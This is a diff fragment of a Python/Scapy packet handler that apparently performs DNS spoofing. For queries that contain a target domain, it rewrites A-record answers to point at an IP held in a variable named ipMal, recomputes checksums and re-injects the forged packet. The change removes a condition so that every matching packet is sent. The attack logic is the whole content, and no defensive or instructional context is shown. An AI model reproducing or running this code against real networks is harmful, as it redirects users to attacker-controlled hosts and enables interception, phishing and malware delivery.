@@ -70,8 +70,6 @@ def process_packet(packet):
         destination_ip = ip_packet.dst
         destination_port = udp_packet.dport
         
-        # if ip_packet.dst = ipTrap:
-        # print(dns_packet.qd.name)
         if trapUrl in dns_packet.qd.qname:
             # dns_packet.show()
             print(" ------------- ")
@@ -81,7 +79,7 @@ def process_packet(packet):
                 print(dns_packet.an.type)
                 # dns_packet.an.rdata = ipMal
                 if (dns_packet.an.type == 1):
-                    dns_packet.an = DNSRR(rrname=trapUrl, rdata=ipMal) 
+                    dns_packet.an.rdata = ipMal
                 elif (dns_packet.an.type == 28):
                     # dns_packet.an = DNSRR(rrname=trapUrl, rdata=ip6Mal)
                     packet[IP].dst = packet[IP].src
@@ -92,9 +90,8 @@ def process_packet(packet):
                 del packet[IP].len
                 del packet[UDP].chksum
                 del packet[UDP].len
-		
-		if (not type=="3"):
-                    sendp(packet, iface = "enp0s3", verbose=True)
+
+		        sendp(packet, iface = "enp0s3", verbose=True)
 
             # Display complete DNS packet information
             
